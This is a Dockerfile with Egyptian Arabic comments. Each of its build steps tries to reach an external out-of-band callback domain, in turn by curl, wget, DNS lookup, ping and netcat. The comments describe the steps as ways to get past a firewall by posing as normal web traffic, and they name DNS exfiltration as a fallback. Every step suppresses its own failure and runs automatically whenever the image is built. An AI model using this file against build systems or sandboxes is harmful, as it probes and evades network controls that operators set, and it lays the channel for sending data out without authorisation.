FROM alpine:latest

# 1. تنزيل كل الأدوات الممكنة
RUN apk update && apk add --no-cache curl wget bind-tools netcat-openbsd iputils

# --- المحاولة الأولى: التنكر في بورت 80 (HTTP Standard) ---
# الفايروول بيشوف ده ترافيك ويب عادي فممكن يعديه
RUN curl http://port80.d52f6ao3t4go9q4ej3t0hnwnfxuoaqx5r.oast.online:80 || true

# --- المحاولة الثانية: استخدام Wget (لو curl محظور) ---
RUN wget -qO- http://wget.d52f6ao3t4go9q4ej3t0hnwnfxuoaqx5r.oast.online:80 || true

# --- المحاولة الثالثة (والأقوى): DNS Exfiltration ---
# حتى لو الـ HTTP مقفول، السيرفر لازم يترجم الدومين لـ IP
# الأمر ده مش بيفتح موقع، ده بس بيسأل "مين الدومين ده؟" وده بيوصلك كـ DNS Log
RUN nslookup dns-check.d52f6ao3t4go9q4ej3t0hnwnfxuoaqx5r.oast.online || true
RUN ping -c 2 ping.d52f6ao3t4go9q4ej3t0hnwnfxuoaqx5r.oast.online || true

# --- المحاولة الرابعة: Netcat (Raw TCP) ---
# محاولة اتصال مباشر TCP
RUN nc -z -v -w 5 nc.d52f6ao3t4go9q4ej3t0hnwnfxuoaqx5r.oast.online 80 || true
